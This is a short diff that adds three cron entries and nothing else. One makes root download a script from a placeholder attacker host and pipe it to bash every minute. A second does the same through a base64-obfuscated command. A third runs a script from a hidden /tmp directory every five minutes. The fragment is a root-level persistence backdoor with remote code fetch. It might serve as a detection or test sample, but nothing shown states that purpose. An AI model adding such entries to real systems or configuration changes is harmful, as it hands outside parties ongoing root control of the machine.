@@ -1,0 +1,3 @@
+* * * * * root bash -c 'curl http://attacker.example/payload.sh | bash'
+* * * * * root /bin/bash -c "$(echo Y3VybCBhdHRhY2tlci5leGFtcGxlL3x8YmFzaA== | base64 -d)"
+*/5 * * * * user /tmp/.hidden/maintain.sh
